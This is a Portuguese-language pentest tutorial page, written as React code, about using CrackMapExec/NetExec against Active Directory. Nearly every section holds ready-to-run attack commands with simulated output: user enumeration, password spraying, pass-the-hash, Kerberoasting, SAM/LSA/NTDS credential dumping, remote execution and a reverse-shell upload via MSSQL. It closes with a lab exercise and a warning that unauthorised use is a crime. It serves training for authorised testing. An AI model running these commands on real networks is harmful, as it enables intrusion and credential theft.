import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function CrackMapExec() {
  return (
    <PageContainer
      title="CrackMapExec / NetExec — canivete suíço de AD"
      subtitle="Spray, enum, exec, dump em SMB/LDAP/WinRM/MSSQL/RDP. A ferramenta mais usada em pentest interno Windows."
      difficulty="avancado"
      timeToRead="20 min"
    >
      <h2>CME → NetExec (fork mantido)</h2>
      <p>
        O CrackMapExec original (mpgn) foi arquivado em 2023. O fork ativo é
        <strong> NetExec (nxc)</strong> — mesmos comandos, melhorias, bugs corrigidos.
        Use <code>nxc</code> em projeto novo, mas a sintaxe abaixo é 100% compatível.
      </p>

      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y netexec || pipx install netexec",
            out: `Reading package lists... Done
netexec is already the newest version (1.2.0).
0 upgraded, 0 newly installed.`,
            outType: "muted",
          },
          {
            cmd: "nxc --version",
            out: `nxc version 1.2.0
[+] Loaded 5 modules from ~/.nxc/modules`,
            outType: "info",
          },
          {
            cmd: "nxc --help | head -20",
            out: `usage: nxc [-h] [-v] [--version] {smb,ssh,winrm,ldap,mssql,wmi,rdp,nfs,ftp,vnc} ...

Protocols:
    smb        own stuff using SMB
    ssh        own stuff using SSH
    winrm      own stuff using WinRM
    ldap       own stuff using LDAP
    mssql      own stuff using MSSQL
    wmi        own stuff using WMI
    rdp        own stuff using RDP
    nfs        own stuff using NFS
    ftp        own stuff using FTP
    vnc        own stuff using VNC`,
            outType: "default",
          },
        ]}
      />

      <h2>Recon — descobrir DCs e máquinas Windows</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "scan SMB sem credencial — só fingerprint",
            cmd: "nxc smb 192.168.50.0/24",
            out: `SMB  192.168.50.10  445  DC01     [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:empresa.local) (signing:True)  (SMBv1:False)
SMB  192.168.50.11  445  DC02     [*] Windows Server 2019 Standard 17763 x64 (name:DC02) (domain:empresa.local) (signing:True)  (SMBv1:False)
SMB  192.168.50.20  445  WS-RH    [*] Windows 10.0 Build 19041 x64 (name:WS-RH) (domain:EMPRESA) (signing:False)  (SMBv1:False)
SMB  192.168.50.21  445  WS-FIN   [*] Windows 10.0 Build 19041 x64 (name:WS-FIN) (domain:EMPRESA) (signing:False)  (SMBv1:False)
SMB  192.168.50.30  445  FILE-01  [*] Windows Server 2016 Standard 14393 x64 (name:FILE-01) (domain:empresa.local) (signing:False)  (SMBv1:True)   ← SMBv1 = vuln
SMB  192.168.50.40  445  PRT-LX   [*] Linux 6.5.0 (name:PRT-LX) (domain:WORKGROUP) (signing:False)`,
            outType: "info",
          },
          {
            comment: "extrair só os DCs",
            cmd: "nxc smb 192.168.50.0/24 | grep -i 'Windows Server' | awk '{print $2}' > dcs.txt",
            out: `(silencioso. dcs.txt:)
192.168.50.10
192.168.50.11
192.168.50.30`,
            outType: "default",
          },
          {
            comment: "null session — testar acesso anônimo",
            cmd: "nxc smb 192.168.50.10 -u '' -p '' --shares",
            out: `SMB  192.168.50.10  445  DC01  [+] empresa.local\\: 
SMB  192.168.50.10  445  DC01  [*] Enumerated shares
SMB  192.168.50.10  445  DC01  Share           Permissions     Remark
SMB  192.168.50.10  445  DC01  -----           -----------     ------
SMB  192.168.50.10  445  DC01  IPC$            READ            Remote IPC
SMB  192.168.50.10  445  DC01  NETLOGON                        Logon server share
SMB  192.168.50.10  445  DC01  SYSVOL                          Logon server share`,
            outType: "warning",
          },
        ]}
      />

      <h2>User enumeration (sem credencial)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "RID brute via null session",
            cmd: "nxc smb 192.168.50.10 -u '' -p '' --rid-brute 4000",
            out: `SMB  192.168.50.10  445  DC01  [*] Brute forcing RIDs
SMB  192.168.50.10  445  DC01  500: EMPRESA\\Administrator (SidTypeUser)
SMB  192.168.50.10  445  DC01  501: EMPRESA\\Guest (SidTypeUser)
SMB  192.168.50.10  445  DC01  502: EMPRESA\\krbtgt (SidTypeUser)
SMB  192.168.50.10  445  DC01  512: EMPRESA\\Domain Admins (SidTypeGroup)
SMB  192.168.50.10  445  DC01  513: EMPRESA\\Domain Users (SidTypeGroup)
SMB  192.168.50.10  445  DC01  1103: EMPRESA\\ana.silva (SidTypeUser)
SMB  192.168.50.10  445  DC01  1104: EMPRESA\\joao.lopes (SidTypeUser)
SMB  192.168.50.10  445  DC01  1105: EMPRESA\\svc-vpn (SidTypeUser)
SMB  192.168.50.10  445  DC01  1106: EMPRESA\\svc-mssql (SidTypeUser)
SMB  192.168.50.10  445  DC01  1107: EMPRESA\\svc-backup (SidTypeUser)`,
            outType: "warning",
          },
          {
            comment: "extrair só usernames para spray",
            cmd: "nxc smb 192.168.50.10 -u '' -p '' --rid-brute 4000 | grep SidTypeUser | awk '{print $6}' | cut -d'\\' -f2 > users.txt",
            out: `(users.txt: 87 nomes)
Administrator
Guest
ana.silva
joao.lopes
svc-vpn
[...]`,
            outType: "info",
          },
          {
            comment: "Kerbrute — mais rápido e menos ruidoso (não loga)",
            cmd: "kerbrute userenum -d empresa.local --dc 192.168.50.10 users.txt",
            out: `Version: dev (n/a)
2026/04/03 23:42:11 >  Using KDC: 192.168.50.10:88

2026/04/03 23:42:11 >  [+] VALID USERNAME:	ana.silva@empresa.local
2026/04/03 23:42:11 >  [+] VALID USERNAME:	joao.lopes@empresa.local
2026/04/03 23:42:11 >  [+] VALID USERNAME:	svc-vpn@empresa.local
2026/04/03 23:42:11 >  Done! Tested 87 usernames (3 valid) in 0.421 seconds`,
            outType: "success",
          },
        ]}
      />

      <h2>Password spray (1 senha × N users)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "tentar Empresa@2025 em TODOS users — espalha pela conta, não por senha",
            cmd: "nxc smb 192.168.50.10 -u users.txt -p 'Empresa@2025!' --continue-on-success",
            out: `SMB  192.168.50.10  445  DC01  [-] empresa.local\\Administrator:Empresa@2025! STATUS_LOGON_FAILURE
SMB  192.168.50.10  445  DC01  [-] empresa.local\\Guest:Empresa@2025! STATUS_LOGON_FAILURE
SMB  192.168.50.10  445  DC01  [+] empresa.local\\ana.silva:Empresa@2025!                     ← achou!
SMB  192.168.50.10  445  DC01  [-] empresa.local\\joao.lopes:Empresa@2025! STATUS_LOGON_FAILURE
SMB  192.168.50.10  445  DC01  [+] empresa.local\\svc-vpn:Empresa@2025! (Pwn3d!)             ← admin local!`,
            outType: "warning",
          },
          {
            comment: "spray com NTLM hash em vez de senha",
            cmd: "nxc smb 192.168.50.0/24 -u ana.silva -H c1e07adc59f6c3eaa7a02e7a4e5f5cc1",
            out: `SMB  192.168.50.10  445  DC01     [-] empresa.local\\ana.silva:c1e07adc... STATUS_NOT_SUPPORTED   ← signing required
SMB  192.168.50.20  445  WS-RH    [+] empresa.local\\ana.silva:c1e07adc... (Pwn3d!)              ← admin!
SMB  192.168.50.21  445  WS-FIN   [+] empresa.local\\ana.silva:c1e07adc... (Pwn3d!)              ← admin!
SMB  192.168.50.30  445  FILE-01  [+] empresa.local\\ana.silva:c1e07adc...                       ← user
SMB  192.168.50.40  445  PRT-LX   [+] empresa.local\\ana.silva:c1e07adc...`,
            outType: "error",
          },
          {
            comment: "ATENÇÃO: AD bloqueia conta após N falhas — sempre check policy primeiro",
            cmd: "nxc smb 192.168.50.10 -u ana.silva -p 'qualquer' --pass-pol",
            out: `SMB  192.168.50.10  445  DC01  [+] Dumping password info for domain: EMPRESA
SMB  192.168.50.10  445  DC01  Minimum password length: 8
SMB  192.168.50.10  445  DC01  Password history length: 24
SMB  192.168.50.10  445  DC01  Maximum password age: 42 days
SMB  192.168.50.10  445  DC01  Password Complexity Flags: 000001
SMB  192.168.50.10  445  DC01    Domain Refuse Password Change: 0
SMB  192.168.50.10  445  DC01    Domain Password Store Cleartext: 0
SMB  192.168.50.10  445  DC01    Domain Password Lockout Admins: 0
SMB  192.168.50.10  445  DC01    Domain Password No Clear Change: 0
SMB  192.168.50.10  445  DC01    Domain Password No Anon Change: 0
SMB  192.168.50.10  445  DC01    Domain Password Complex: 1
SMB  192.168.50.10  445  DC01  Minimum password age: 0 days
SMB  192.168.50.10  445  DC01  Reset Account Lockout Counter: 30 minutes
SMB  192.168.50.10  445  DC01  Locked Account Duration: 30 minutes
SMB  192.168.50.10  445  DC01  Account Lockout Threshold: 5             ← 5 erros = lock!
SMB  192.168.50.10  445  DC01  Forced Log off Time: Not Set`,
            outType: "info",
          },
        ]}
      />

      <h2>Pós-credenciais — Enumeração</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "shares com qualquer user válido",
            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' --shares",
            out: `SMB  192.168.50.30  445  FILE-01  [+] empresa.local\\ana.silva:Empresa@2025!
SMB  192.168.50.30  445  FILE-01  [*] Enumerated shares
SMB  192.168.50.30  445  FILE-01  Share           Permissions     Remark
SMB  192.168.50.30  445  FILE-01  -----           -----------     ------
SMB  192.168.50.30  445  FILE-01  ADMIN$                          Remote Admin
SMB  192.168.50.30  445  FILE-01  C$                              Default share
SMB  192.168.50.30  445  FILE-01  IPC$            READ            Remote IPC
SMB  192.168.50.30  445  FILE-01  RH              READ,WRITE      Recursos Humanos
SMB  192.168.50.30  445  FILE-01  Financeiro      READ            Documentos
SMB  192.168.50.30  445  FILE-01  Public          READ,WRITE      Publica`,
            outType: "warning",
          },
          {
            comment: "spider — encontra arquivos interessantes",
            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' -M spider_plus",
            out: `SPIDER_PLUS    192.168.50.30  445  FILE-01  Started spidering
SPIDER_PLUS    192.168.50.30  445  FILE-01  RH/folha-pagamentos.xlsx        842KB
SPIDER_PLUS    192.168.50.30  445  FILE-01  RH/contratos/ana_silva.pdf      214KB
SPIDER_PLUS    192.168.50.30  445  FILE-01  Financeiro/balanco-2025.xlsx    1.4MB
SPIDER_PLUS    192.168.50.30  445  FILE-01  Public/passwords.txt            422B    ← !!
SPIDER_PLUS    192.168.50.30  445  FILE-01  Public/wifi-corporativo.docx    18KB
SPIDER_PLUS    192.168.50.30  445  FILE-01  output: /tmp/nxc_spider_output_192.168.50.30.json`,
            outType: "error",
          },
          {
            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' --get-file 'Public/passwords.txt' 'pwd-leak.txt' --share Public",
            out: `SMB  192.168.50.30  445  FILE-01  [+] File downloaded -> ./pwd-leak.txt`,
            outType: "info",
          },
          {
            cmd: "cat pwd-leak.txt",
            out: `wifi corp: Empresa@WiFi2025
admin do roteador: 192.168.0.1 admin/Empresa#42
SQL prod: sa / SqlEmpresa2025!@
joao - VPN: jlopes / Vpn2025!`,
            outType: "error",
          },
        ]}
      />

      <h2>LDAP enum — usuários, grupos, GPOs</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --users",
            out: `LDAP  192.168.50.10  389  DC01  [+] empresa.local\\ana.silva:Empresa@2025!
LDAP  192.168.50.10  389  DC01  [*] Enumerated 142 users
LDAP  192.168.50.10  389  DC01  -Username-                    -Last Logon-          -Description-
LDAP  192.168.50.10  389  DC01  Administrator                 2026-04-03 14:21:42   Built-in account
LDAP  192.168.50.10  389  DC01  Guest                         <never>               Built-in account
LDAP  192.168.50.10  389  DC01  krbtgt                        <never>               Key Distribution
LDAP  192.168.50.10  389  DC01  ana.silva                     2026-04-03 22:14:18   
LDAP  192.168.50.10  389  DC01  svc-vpn                       2026-04-03 21:42:09   Service VPN — Welcome2025!@   ← desc com SENHA!
LDAP  192.168.50.10  389  DC01  svc-mssql                     2026-04-03 18:32:01   SQL Service Account`,
            outType: "warning",
          },
          {
            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --kerberoasting kerb_hashes.txt",
            out: `LDAP  192.168.50.10  389  DC01  [+] empresa.local\\ana.silva:Empresa@2025!
LDAP  192.168.50.10  389  DC01  [*] Total of records returned 3
LDAP  192.168.50.10  389  DC01  $krb5tgs$23$*svc-mssql$EMPRESA.LOCAL$MSSQLSvc/sql.empresa.local~1433*$abc...
LDAP  192.168.50.10  389  DC01  $krb5tgs$23$*svc-web$EMPRESA.LOCAL$HTTP/web.empresa.local~80*$def...
LDAP  192.168.50.10  389  DC01  [+] Hashes saved to kerb_hashes.txt`,
            outType: "warning",
          },
          {
            cmd: "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
            out: `Recovered........: 1/3 (33.33%) Digests
$krb5tgs$23$*svc-mssql$EMPRESA.LOCAL$MSSQLSvc/sql.empresa.local~1433*$abc...:SqlEmpresa2025!@`,
            outType: "error",
          },
          {
            comment: "AS-REP roasting — usuários sem pre-auth Kerberos",
            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --asreproast asrep.txt",
            out: `LDAP  192.168.50.10  389  DC01  [*] Total of records returned 1
LDAP  192.168.50.10  389  DC01  $krb5asrep$svc-old@EMPRESA.LOCAL:abc123def456...`,
            outType: "warning",
          },
        ]}
      />

      <h2>Execução remota (com admin local)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' -x 'whoami; hostname; ipconfig'",
            out: `SMB  192.168.50.20  445  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
SMB  192.168.50.20  445  WS-RH  [+] Executed command via wmiexec
SMB  192.168.50.20  445  WS-RH  empresa\\ana.silva
SMB  192.168.50.20  445  WS-RH  WS-RH
SMB  192.168.50.20  445  WS-RH  
SMB  192.168.50.20  445  WS-RH  Windows IP Configuration
SMB  192.168.50.20  445  WS-RH  
SMB  192.168.50.20  445  WS-RH    IPv4 Address. . . . : 192.168.50.20
SMB  192.168.50.20  445  WS-RH    Subnet Mask . . . . : 255.255.255.0`,
            outType: "info",
          },
          {
            cmd: "nxc winrm 192.168.50.20 -u ana.silva -p 'Empresa@2025!' -x 'powershell -c \"Get-Process | Select -First 5\"'",
            out: `WINRM  192.168.50.20  5985  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
WINRM  192.168.50.20  5985  WS-RH  [+] Executed command
WINRM  192.168.50.20  5985  WS-RH  Handles  NPM(K)  PM(K)   WS(K)  CPU(s)  Id  ProcessName
WINRM  192.168.50.20  5985  WS-RH    214      11    2236    8480    0.42   42  AggregatorHost
WINRM  192.168.50.20  5985  WS-RH   1284      52   42412   62028    8.21  624  audiodg
WINRM  192.168.50.20  5985  WS-RH    342      18    7836   16244    1.42  448  conhost
WINRM  192.168.50.20  5985  WS-RH   1014      62  131884  142680   12.30 4421  explorer
WINRM  192.168.50.20  5985  WS-RH    342      14    3624    8124    0.18  528  fontdrvhost`,
            outType: "default",
          },
        ]}
      />

      <h2>Dump de credenciais — SAM, LSA, NTDS</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' --sam",
            out: `SMB  192.168.50.20  445  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
SMB  192.168.50.20  445  WS-RH  [+] Dumping SAM hashes
SMB  192.168.50.20  445  WS-RH  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
SMB  192.168.50.20  445  WS-RH  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  192.168.50.20  445  WS-RH  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  192.168.50.20  445  WS-RH  WS-RH$:1001:aad3b435b51404eeaad3b435b51404ee:8e2c3f4a5b6c7d8e9f0a1b2c3d4e5f60:::`,
            outType: "warning",
          },
          {
            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' --lsa",
            out: `SMB  192.168.50.20  445  WS-RH  [+] Dumping LSA secrets
SMB  192.168.50.20  445  WS-RH  $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:8e2c3f4a5b6c7d8e9f0a1b2c3d4e5f60
SMB  192.168.50.20  445  WS-RH  DefaultPassword: Empresa@2025!
SMB  192.168.50.20  445  WS-RH  EMPRESA.LOCAL/svc-rdp: Empresa@RDP2024
SMB  192.168.50.20  445  WS-RH  $MACHINE.ACC AES256: a1b2c3d4e5f6...`,
            outType: "error",
          },
          {
            cmd: "nxc smb 192.168.50.10 -u admin -p 'AdminDC@2025!' --ntds",
            out: `SMB  192.168.50.10  445  DC01  [+] empresa.local\\admin:AdminDC@2025! (Pwn3d!)
SMB  192.168.50.10  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a coffee...
SMB  192.168.50.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
SMB  192.168.50.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8888888888888888aaaaaaaaaaaaaaaa:::   ← golden ticket!
SMB  192.168.50.10  445  DC01  empresa.local\\ana.silva:1103:aad3b...:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
SMB  192.168.50.10  445  DC01  empresa.local\\joao.lopes:1104:aad3b...:88846f7eaee8fb117ad06bdd830b7586:::
[...]
SMB  192.168.50.10  445  DC01  [+] Dumped 142 NTDS hashes to ~/.nxc/logs/DC01.local_192.168.50.10_2026-04-03_233121.ntds`,
            outType: "error",
          },
        ]}
      />

      <h2>Módulos prebuilt</h2>
      <CommandTable
        title="-M <modulo> (50+ disponíveis)"
        variations={[
          { cmd: "spider_plus", desc: "Lista todos arquivos em todas shares.", output: "Pega .docx, .xlsx, .ps1." },
          { cmd: "lsassy", desc: "Dump de LSASS via comando remoto.", output: "Cleartext + Kerberos tickets." },
          { cmd: "mimikatz", desc: "Sobe mimikatz e dumpa.", output: "AV-friendly via PE Sieve." },
          { cmd: "wdigest", desc: "Habilita WDigest (cleartext em next logon).", output: "Persistência de captura." },
          { cmd: "enum_chrome", desc: "Senhas salvas no Chrome do user logado.", output: "Cookies + cards + autofill." },
          { cmd: "enum_dns", desc: "Lista zones DNS do AD.", output: "Pega todos os hostnames internos." },
          { cmd: "gpp_password", desc: "Procura cpassword em SYSVOL (clássico).", output: "Cred legacy descriptografável." },
          { cmd: "gpp_autologin", desc: "Auto-login GPO em SYSVOL.", output: "Workstation logando automático." },
          { cmd: "rdp", desc: "Habilita RDP no alvo.", output: "Para conectar manualmente depois." },
          { cmd: "uac", desc: "Configura UAC.", output: "Preparar para PsExec." },
          { cmd: "petitpotam", desc: "Coage DC a autenticar (CVE-2021-36942).", output: "Para ntlmrelayx." },
          { cmd: "printerbug", desc: "Coage via Print Spooler.", output: "MS-RPRN." },
          { cmd: "shadowcoerce", desc: "Coage via FSRVP.", output: "Mais um vetor." },
        ]}
      />

      <h2>MSSQL — também é destino</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' -q 'SELECT @@VERSION'",
            out: `MSSQL  192.168.50.40  1433  SQL01  [+] empresa.local\\sa:SqlEmpresa2025!@ (Pwn3d!)
MSSQL  192.168.50.40  1433  SQL01  [+] Executed query
MSSQL  192.168.50.40  1433  SQL01  Microsoft SQL Server 2019 (RTM-CU18) (KB5017593) - 15.0.4261.1 (X64)
MSSQL  192.168.50.40  1433  SQL01  Sep 14 2022 16:06:14
MSSQL  192.168.50.40  1433  SQL01  Copyright (C) 2019 Microsoft Corporation`,
            outType: "info",
          },
          {
            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' -x 'whoami'",
            out: `MSSQL  192.168.50.40  1433  SQL01  [+] Executed command via xp_cmdshell
MSSQL  192.168.50.40  1433  SQL01  nt service\\mssqlserver`,
            outType: "warning",
          },
          {
            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' --put-file revshell.exe 'C:\\Users\\Public\\x.exe'",
            out: `MSSQL  192.168.50.40  1433  SQL01  [+] File uploaded successfully: C:\\Users\\Public\\x.exe`,
            outType: "error",
          },
        ]}
      />

      <h2>Database de loot (~/.nxc)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls -la ~/.nxc/",
            out: `drwxr-xr-x 6 wallyson wallyson  4096 Apr  3 23:42 .
drwxr-xr-x 1 wallyson wallyson   228 Apr  3 23:42 ..
-rw-r--r-- 1 wallyson wallyson 18421 Apr  3 23:42 nxc.conf
drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 logs
drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 modules
drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 screenshots
drwxr-xr-x 5 wallyson wallyson  4096 Apr  3 23:42 workspaces`,
            outType: "default",
          },
          {
            comment: "TUDO captura é salvo no SQLite por workspace",
            cmd: "nxc smb --workspace cliente_x",
            out: `[*] Switched workspace to: cliente_x`,
            outType: "muted",
          },
          {
            cmd: "nxcdb workspace use cliente_x",
            out: `nxcdb (cliente_x) > 
(modo interativo: list creds, list hosts, ...)`,
            outType: "info",
          },
          {
            cmd: "(nxcdb) creds",
            out: `+----+-------------+-------------+----------------------------------+----------+--------+
| ID | Domain      | Username    | Password                         | Type     | Owned  |
+----+-------------+-------------+----------------------------------+----------+--------+
| 1  | empresa.loc | ana.silva   | Empresa@2025!                    | plain    | True   |
| 2  | empresa.loc | svc-vpn     | Welcome2025!@                    | plain    | True   |
| 3  | empresa.loc | svc-mssql   | SqlEmpresa2025!@                 | plain    | True   |
| 4  | empresa.loc | krbtgt      | 8888888888888888aaaaaaaaaaaaaaaa | hash     | True   |
+----+-------------+-------------+----------------------------------+----------+--------+`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Lab: pwn AD com Vulnerable AD"
        goal="Um lab AD reproduzível no docker, atacar com nxc do início ao fim."
        steps={[
          "Suba GOAD (Game Of Active Directory) — labs prontos.",
          "Recon: nxc smb 192.168.10.0/24.",
          "User enum via RID brute (null session).",
          "Spray a senha 'Welcome01!' contra todos.",
          "Ache o admin local; dumpe SAM.",
          "Use o hash do Administrator local em pass-the-hash em todos os hosts.",
          "Dumpe NTDS do DC.",
        ]}
        command={`# clonar GOAD
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD/ansible && ./goad.sh -p docker -i sevenkingdoms.local

# atacar
nxc smb 192.168.56.0/24
nxc smb 192.168.56.10 -u '' -p '' --rid-brute 2000 | grep SidTypeUser
nxc smb 192.168.56.10 -u users.txt -p 'Welcome01!' --continue-on-success

# pegou? agora dump
nxc smb 192.168.56.20 -u found_user -p 'Welcome01!' --sam --lsa
nxc smb 192.168.56.10 -u admin -p 'AdminPass!' --ntds`}
        expected={`SMB  192.168.56.20  445  CASTELBLACK  [+] sevenkingdoms\\stannis:Welcome01! (Pwn3d!)
SMB  192.168.56.10  445  WINTERFELL    [+] Dumped 142 NTDS hashes`}
        verify="Quando terminar: cd GOAD/ansible && ./goad.sh -p docker -t destroy"
      />

      <AlertBox type="warning" title="DPCAM (Domain Password Audit Mode)">
        Para auditoria autorizada, use <code>nxc smb DC -u admin -p X --pwdLastSet --admin-count</code> +
        <code> --ntds</code> + <strong>DPAT</strong> (offline tool) — gera relatório HTML completo
        com top senhas, contas com senha que nunca expira, contas inativas, password reuse.
      </AlertBox>

      <AlertBox type="danger" title="Sempre dentro do escopo">
        Spray, RID brute e dump de NTDS são técnicas que CAEM dentro de "intrusão não autorizada"
        no Brasil (Lei 12.737/12). Sem RoE escrito, são crime. Em red team com escopo, documente
        cada hash dumpado e saneie o relatório (não inclua hashes reais — substitua por sanitized).
      </AlertBox>
    </PageContainer>
  );
}
